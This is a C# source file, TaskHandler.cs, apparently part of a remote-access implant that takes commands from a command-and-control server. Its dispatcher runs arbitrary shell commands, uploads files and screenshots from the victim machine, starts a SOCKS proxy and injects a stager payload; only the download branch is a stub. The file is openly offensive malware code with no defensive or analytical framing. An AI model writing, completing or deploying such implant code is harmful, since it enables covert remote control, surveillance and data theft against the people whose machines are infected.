// TaskHandler.cs
// Dispatcher for tasks received from C2

using System;
using Agent.CommandModules;
using Agent.Utils;

namespace Agent
{
    public static class TaskHandler
    {
        public static string Handle(string task, HttpManager http)
        {
            string[] parts = task.Split('|');
            string cmd = parts[0].ToLower();
            string arg = parts.Length > 1 ? parts[1] : "";
            switch (cmd)
            {
                case "shell":
                    return ShellExecutor.Run(arg);
                case "upload":
                    http.UploadFile(arg);
                    return $"Uploaded file: {arg}";
                case "download":
                    // Implement download logic (stub)
                    return "Download not implemented yet.";
                case "screenshot":
                    string file = Screenshot.Capture();
                    http.UploadScreenshot(file);
                    return $"Screenshot uploaded: {file}";
                case "socks":
                    return SocksProxy.Start(arg);
                case "stager":
                    return Stager.Inject(arg);
                default:
                    return "Unknown task";
            }
        }
    }
}
